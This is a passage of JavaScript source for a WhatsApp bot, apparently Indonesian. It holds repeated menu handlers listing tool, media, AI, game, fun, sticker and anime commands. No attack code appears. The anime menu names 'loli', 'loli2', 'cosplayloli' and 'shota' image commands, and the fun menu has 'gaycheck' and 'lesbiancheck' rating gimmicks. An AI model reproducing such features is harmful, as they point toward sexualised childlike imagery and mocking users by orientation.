╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Tool Menu\` ]┄┄┄┄
${setv} ${prefix}obfuscate
${setv} ${prefix}styletext
${setv} ${prefix}fliptext
${setv} ${prefix}tts
${setv} ${prefix}say
${setv} ${prefix}togif
${setv} ${prefix}toqr
${setv} ${prefix}bass
${setv} ${prefix}blown
${setv} ${prefix}deep
${setv} ${prefix}earrape
${setv} ${prefix}fast
${setv} ${prefix}fat
${setv} ${prefix}nightcore
${setv} ${prefix}reverse
${setv} ${prefix}robot
${setv} ${prefix}slow
${setv} ${prefix}smooth
${setv} ${prefix}squirrel
${setv} ${prefix}tinyurl
${setv} ${prefix}tovn
${setv} ${prefix}toptv
${setv} ${prefix}toaudio
${setv} ${prefix}tomp3
${setv} ${prefix}tomp4
${setv} ${prefix}toimg
${setv} ${prefix}toonce
${setv} ${prefix}toptv
${setv} ${prefix}sticker
${setv} ${prefix}qc
${setv} ${prefix}smeme
${setv} ${prefix}smeta
${setv} ${prefix}take
${setv} ${prefix}emojimix
${setv} ${prefix}volaudio
${setv} ${prefix}volvideo
${setv} ${prefix}ebinary
${setv} ${prefix}dbinary
${setv} ${prefix}ssweb
${setv} ${prefix}quoted
${setv} ${prefix}translate
${setv} ${prefix}get
${setv} ${prefix}tourl
${setv} ${prefix}write
╰──────❍`
menuv(xmenu_oh)
}
break
case 'listmenulain': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`List Menu\` ]┄┄┄┄
${setv} ${prefix}listprem
${setv} ${prefix}listowner
${setv} ${prefix}liststicker
${setv} ${prefix}listimage
${setv} ${prefix}listvideo
${setv} ${prefix}listvn
${setv} ${prefix}listapk
${setv} ${prefix}listzip
${setv} ${prefix}listpdf
${setv} ${prefix}listbadword
${setv} ${prefix}listpc
${setv} ${prefix}listgc
╰──────❍`
menuv(xmenu_oh)
}
break
case 'randomphotomenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Random Photo\` ]┄┄┄┄
${setv} ${prefix}aesthetic
${setv} ${prefix}coffee
${setv} ${prefix}wikimedia
${setv} ${prefix}wallpaper
${setv} ${prefix}art
${setv} ${prefix}bts
${setv} ${prefix}dogwoof
${setv} ${prefix}catmeow
${setv} ${prefix}lizardpic
${setv} ${prefix}goosebird
${setv} ${prefix}8ballpool
${setv} ${prefix}cosplay
${setv} ${prefix}hacker
${setv} ${prefix}cyber
${setv} ${prefix}gamewallpaper
${setv} ${prefix}islamic
${setv} ${prefix}jennie
${setv} ${prefix}jiso
${setv} ${prefix}satanic
${setv} ${prefix}justina
${setv} ${prefix}cartoon
${setv} ${prefix}pentol
${setv} ${prefix}cat
${setv} ${prefix}kpop
${setv} ${prefix}exo
${setv} ${prefix}lisa
${setv} ${prefix}space
${setv} ${prefix}car
${setv} ${prefix}technology
${setv} ${prefix}bike
${setv} ${prefix}shortquote
${setv} ${prefix}antiwork
${setv} ${prefix}hacking
${setv} ${prefix}boneka
${setv} ${prefix}rose
${setv} ${prefix}ryujin
${setv} ${prefix}ulzzangboy
${setv} ${prefix}ulzzanggirl
${setv} ${prefix}wallml
${setv} ${prefix}wallphone
${setv} ${prefix}mountain
${setv} ${prefix}goose
${setv} ${prefix}profilepic
${setv} ${prefix}couplepp
${setv} ${prefix}programming
${setv} ${prefix}pubg
${setv} ${prefix}blackpink
${setv} ${prefix}randomboy  
${setv} ${prefix}randomgirl
${setv} ${prefix}hijab  
${setv} ${prefix}chinese
${setv} ${prefix}indo
${setv} ${prefix}japanese
${setv} ${prefix}korean
${setv} ${prefix}malay
${setv} ${prefix}thai
${setv} ${prefix}vietnamese
╰──────❍`
menuv(xmenu_oh)
}
break
case 'randomvideomenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Random Video\` ]┄┄┄┄
${setv} ${prefix}tiktokgirl
${setv} ${prefix}tiktoknukthy
${setv} ${prefix}tiktokkayes
${setv} ${prefix}tiktokpanrika
${setv} ${prefix}tiktoknotnot
${setv} ${prefix}tiktokghea
${setv} ${prefix}tiktoksantuy
${setv} ${prefix}tiktokbocil
╰──────❍`
menuv(xmenu_oh)
}
break
case 'stalkermenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Stalker\` ]┄┄┄┄
${setv} ${prefix}tiktokstalk
${setv} ${prefix}mlstalk
${setv} ${prefix}npmstalk
${setv} ${prefix}ghstalk
╰──────❍`
menuv(xmenu_oh)
}
break
case 'aimenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`OpenAI\` ]┄┄┄┄
${setv} ${prefix}blackboxai
${setv} ${prefix}travel-assistant
${setv} ${prefix}guru-ai
${setv} ${prefix}ai
${setv} ${prefix}gemini
${setv} ${prefix}islamiai
${setv} ${prefix}gpt4
${setv} ${prefix}lenwy
${setv} ${prefix}simi
${setv} ${prefix}emi-ai
${setv} ${prefix}claude-ai
${setv} ${prefix}hercai-cartoon
${setv} ${prefix}hercai-animefy
${setv} ${prefix}hercai-lexica
${setv} ${prefix}hercai-prodia
${setv} ${prefix}hercai-simurg
${setv} ${prefix}hercai-raava
${setv} ${prefix}hercai-shonin
${setv} ${prefix}realistic
${setv} ${prefix}3dmodel
${setv} ${prefix}photoleap
${setv} ${prefix}openai
${setv} ${prefix}dalle
${setv} ${prefix}ai
${setv} ${prefix}remini
╰─┬────❍`
menuv(xmenu_oh)
}
break
case 'gamemenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Game\` ]┄┄┄┄
${setv} ${prefix}truth
${setv} ${prefix}dare
${setv} ${prefix}suit
${setv} ${prefix}tictactoe
${setv} ${prefix}math
${setv} ${prefix}playbomb
${setv} ${prefix}casino
${setv} ${prefix}rob
${setv} ${prefix}slot
${setv} ${prefix}dice 
${setv} ${prefix} profile
${setv} ${prefix} claim
${setv} ${prefix} tmoney
${setv} ${prefix} tflimit
╰──────❍`
menuv(xmenu_oh)
}
break
case 'funmenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Fun\` ]┄┄┄┄
${setv} ${prefix}define
${setv} ${prefix}readmore
${setv} ${prefix}fact
${setv} ${prefix}couple
${setv} ${prefix}soulmate
${setv} ${prefix}stupidcheck
${setv} ${prefix}handsomecheck
${setv} ${prefix}uncleancheck
${setv} ${prefix}hotcheck
${setv} ${prefix}smartcheck
${setv} ${prefix}greatcheck
${setv} ${prefix}evilcheck
${setv} ${prefix}dogcheck
${setv} ${prefix}coolcheck
${setv} ${prefix}waifucheck
${setv} ${prefix}awesomecheck
${setv} ${prefix}gaycheck
${setv} ${prefix}cutecheck
${setv} ${prefix}lesbiancheck
${setv} ${prefix}hornycheck
${setv} ${prefix}prettycheck
${setv} ${prefix}lovelycheck
${setv} ${prefix}uglycheck
${setv} ${prefix}pick
${setv} ${prefix}pickupline
${setv} ${prefix}quotes
${setv} ${prefix}can
${setv} ${prefix}is
${setv} ${prefix}when
${setv} ${prefix}where
${setv} ${prefix}what
${setv} ${prefix}how
${setv} ${prefix}rate
${setv} ${prefix}cry
${setv} ${prefix}kill
${setv} ${prefix}hug
${setv} ${prefix}pat
${setv} ${prefix}lick 
${setv} ${prefix}kiss
${setv} ${prefix}bite
${setv} ${prefix}yeet
${setv} ${prefix}bully
${setv} ${prefix}bonk
${setv} ${prefix}wink
${setv} ${prefix}poke
${setv} ${prefix}nom
${setv} ${prefix}slap
${setv} ${prefix}smile 
${setv} ${prefix}wave
${setv} ${prefix}awoo
${setv} ${prefix}blush
${setv} ${prefix}smug
${setv} ${prefix}glomp 
${setv} ${prefix}happy
${setv} ${prefix}dance
${setv} ${prefix}cringe
${setv} ${prefix}cuddle
${setv} ${prefix}highfive 
${setv} ${prefix}handhold
${setv} ${prefix}spank
${setv} ${prefix}tickle
${setv} ${prefix}feed
${setv} ${prefix}checkme
${setv} ${prefix}sound1 - sound161
╰──────❍`
menuv(xmenu_oh)
}
break
case 'stickermenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Sticker\` ]┄┄┄┄
${setv} ${prefix}goose
${setv} ${prefix}woof
${setv} ${prefix}8ball
${setv} ${prefix}lizard
${setv} ${prefix}meow
${setv} ${prefix}gura
${setv} ${prefix}telestick
╰──────❍`
menuv(xmenu_oh)
}
break
case 'animemenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Anime\` ]┄┄┄┄
${setv} ${prefix}stickhandhold
${setv} ${prefix}stickshinobu
${setv} ${prefix}stickcuddle
${setv} ${prefix}stickhighfive
${setv} ${prefix}stickdance
${setv} ${prefix}stickcringe
${setv} ${prefix}stickhappy
${setv} ${prefix}stickglomp
${setv} ${prefix}sticksmug
${setv} ${prefix}stickblush
${setv} ${prefix}stickawoo
${setv} ${prefix}stickwave
${setv} ${prefix}sticksmile
${setv} ${prefix}stickslap
${setv} ${prefix}stickpoke
${setv} ${prefix}stickwink
${setv} ${prefix}stickbonk
${setv} ${prefix}stickbully
${setv} ${prefix}stickyeet
${setv} ${prefix}stickbike
${setv} ${prefix}stickkiss
${setv} ${prefix}sticklick
${setv} ${prefix}stickpat
${setv} ${prefix}stickhug
${setv} ${prefix}stickkill
${setv} ${prefix}stickcry
${setv} ${prefix}stickspank
${setv} ${prefix}sticktickle
${setv} ${prefix}traceanime
${setv} ${prefix}akira
${setv} ${prefix}akiyama
${setv} ${prefix}ana
${setv} ${prefix}asuna
${setv} ${prefix}ayuzawa
${setv} ${prefix}boruto
${setv} ${prefix}chiho
${setv} ${prefix}chitoge
${setv} ${prefix}cosplayloli
${setv} ${prefix}cosplaysagiri
${setv} ${prefix}deidara
${setv} ${prefix}doraemon
${setv} ${prefix}elaina
${setv} ${prefix}emilia
${setv} ${prefix}erza
${setv} ${prefix}gremory
${setv} ${prefix}hestia
${setv} ${prefix}husbu
${setv} ${prefix}inori
${setv} ${prefix}isuzu
${setv} ${prefix}itachi
${setv} ${prefix}itori
${setv} ${prefix}kaga
${setv} ${prefix}kagura
${setv} ${prefix}kakasih
${setv} ${prefix}kaori
${setv} ${prefix}keneki
${setv} ${prefix}kotori
${setv} ${prefix}kurumi
${setv} ${prefix}loli
${setv} ${prefix}loli2
${setv} ${prefix}madara
${setv} ${prefix}megumin
${setv} ${prefix}mikasa
${setv} ${prefix}mikey
${setv} ${prefix}miku
${setv} ${prefix}minato
${setv} ${prefix}naruto
${setv} ${prefix}neko
${setv} ${prefix}nekonime
${setv} ${prefix}nezuko
${setv} ${prefix}onepiece
${setv} ${prefix}pokemon
${setv} ${prefix}randomnime
${setv} ${prefix}randomnime2
${setv} ${prefix}rize
${setv} ${prefix}sagiri
${setv} ${prefix}sakura
${setv} ${prefix}sasuke
${setv} ${prefix}shina
${setv} ${prefix}shinka
${setv} ${prefix}shinomiya
${setv} ${prefix}shizuka
${setv} ${prefix}shota
${setv} ${prefix}tejina
${setv} ${prefix}toukachan
${setv} ${prefix}tsunade
${setv} ${prefix}waifu
${setv} ${prefix}waifu2
